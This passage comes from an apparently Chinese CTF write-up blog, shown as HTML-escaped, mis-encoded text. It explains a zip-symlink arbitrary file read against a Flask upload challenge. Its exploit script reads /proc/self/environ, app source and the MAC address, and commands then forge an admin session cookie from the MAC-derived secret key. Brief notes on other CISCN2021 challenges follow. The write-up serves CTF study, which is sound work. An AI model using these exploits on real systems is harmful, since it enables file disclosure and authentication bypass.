&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…é€šè¿‡&lt;code>/proc/self/environ&lt;/code>æ–‡ä»¶é‡ŒåŒ…å«è¿›ç¨‹çš„çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»Žä¸­èŽ·å–flaskçš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ¶ä½œè½¯é“¾æŽ¥ï¼ˆå…³äºŽ/procçš„æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/procç›®å½•çš„å¦™ç”¨&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCEåˆ©ç”¨æ€»ç»“&lt;/a>ï¼Œé¢˜-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[ç½‘é¼Žæ¯ 2020 ç™½è™Žç»„]PicDown&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œå¯¹äºŽç›®å½•å†…æ–‡ä»¶çš„åˆ—ä¸¾ä¹Ÿæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå‚è§-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Webé¢˜ extract0r Writeup&lt;/a>&lt;/p>
&lt;p>ç”šè‡³ä¹Ÿå¯ä»¥å†™å…¥shellï¼Œå‚è§-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[æ·±è‚²æ¯ 2021]Zipzip&lt;/a>&lt;/p>
&lt;p>åˆ¶ä½œå¥½çš„è½¯é“¾æŽ¥é€šè¿‡zipæ‰“åŒ…&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ›´å¤šé¢˜ç›®ä¸­çš„åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•&lt;/a>&lt;/p>
&lt;p>å…³äºŽè¿™ä¸ªæ¼æ´žçš„å®žé™…åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ž (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´ž&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 ç”Ÿæˆè½¯é“¾æŽ¥&amp;amp;zip&amp;amp;è‡ªåŠ¨ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 æ ¹æ®macåœ°å€ç”Ÿæˆä¼ªéšæœºæ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>ç¿»å›žå¤´çœ‹æºç ï¼Œå¥½å®¶ä¼™è¿™é‡Œæœ‰å†…é¬¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>è¿”å›žçš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œè€Œæ˜¯secret.secretä¸­çš„å†…å®¹no flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67è¡Œè¿™é‡Œä¼šå¯¹unzipæ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œåªè¦å«æœ‰flagå­—æ ·å°±ä¼šé‡å®šå‘è‡³/?error=1&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œæˆ‘æ„Ÿè§‰åŽŸé¢˜åº”è¯¥secret.pyä¸­çš„&lt;code>secret=&lt;/code>ç›´æŽ¥å°±èƒ½è¯»å‡ºæ¥flagï¼Œæƒ³äº†å¥½ä¹…ï¼Œå†ç»•ä¸€å±‚flag.txtçš„è¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ä»€ä¹ˆbypassçš„æ–¹æ³•äº†ï¼Œæˆ‘å€¾å‘äºŽæ˜¯å¸ƒç½®çŽ¯å¢ƒçš„æ—¶å€™æ²¡æœ‰è®¾ç½®è¿™ä¸€ç‚¹ï¼ˆ&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›easy_python">***[CISCN2021 æ€»å†³èµ›]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>ä¸çŸ¥é“æ˜¯æˆ‘çš„ç½‘ç»œé—®é¢˜è¿˜æ˜¯ä»€ä¹ˆæœªçŸ¥çš„bugâ€¦â€¦checkä¹‹åŽå°±ä¼šå®•æœºï¼Œåªèƒ½é‡æ–°ä¸‹å‘é¶æœº&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›ezj4va">***[CISCN2021 æ€»å†³èµ›]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>è¿˜ä¸ä¼šjava å…ˆç©ºç€TAT&lt;/p></description></item></channel></rss>